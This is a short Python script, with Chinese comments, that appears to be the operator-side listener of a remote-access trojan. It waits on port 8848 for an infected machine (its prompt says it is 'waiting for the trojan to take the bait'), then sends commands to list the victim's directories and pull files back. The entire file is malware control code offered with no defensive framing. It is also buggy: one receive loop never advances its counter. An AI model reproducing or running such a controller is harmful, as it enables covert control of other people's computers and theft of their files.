import socket
import os

S = socket.socket()

S.bind(('0.0.0.0',8848))

S.listen()

print("正在等待木马上钩ing。。。")

s,addr = S.accept()

s.settimeout(10)

print("ip:",addr[0])


def wirte_file():

    # file name
    f = s.recv(1024).decode(encoding='utf-8')
    s.send('ojbk'.encode())

    # file size
    filesize = int(s.recv(1024).decode())
    s.send('ojbk'.encode())


    cursize = 0

    with open(f,'wb') as file:
        while 1:
            data = s.recv(2048)
            cursize += len(data)
            file.write(data)
            if cursize >= filesize:
                break

def send_cmd():
    # 接受盘符
    print("请输入命令：")
    cmd = input()
    s.send(cmd.encode())
    if cmd.split()[0] == 'dir':
        # 接受个数
        num = int(s.recv(1024).decode())
        print(num)
        for i in range(num):
            try:
                res = s.recv(1024).decode()
                print(res)
            except Exception as e:
                print(e)
                return
    elif cmd.split()[0] == 'install':
        # 接受大小
        file_size = int(s.recv(1024).decode())
        s.send('ojbk'.encode())
        now_size = 0
        filee = open(f'{cmd.split()[0]}','ab')
        try:
            while now_size < file_size:
                data = s.recv(1024)
                filee.write(data)
        except:
            print('自动关闭')
        filee.close()
if __name__ == '__main__':
    print("接受到的盘符信息：",s.recv(1024).decode())
    while 1:
        send_cmd()

























